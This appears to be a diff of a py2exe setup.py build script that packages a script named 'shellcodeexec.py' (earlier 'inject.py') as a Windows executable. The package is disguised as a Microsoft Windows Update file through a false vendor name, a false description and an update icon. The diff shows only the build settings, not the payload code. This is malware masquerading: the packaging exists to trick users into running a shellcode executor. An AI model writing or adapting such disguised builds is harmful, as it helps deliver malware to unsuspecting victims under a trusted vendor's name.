@@ -20,7 +20,7 @@ setup(name='Microsoft Corporation',
         description='Microsoft Windows Update Service Temporary File',
         author='Bill Rondell',
         options = dict(py2exe=options),
-        windows = [{'script': "inject.py",
+        windows = [{'script': "shellcodeexec.py",
                     'icon_resources': [(1, "winupdate.ico")]
                    }],
         zipfile = None,
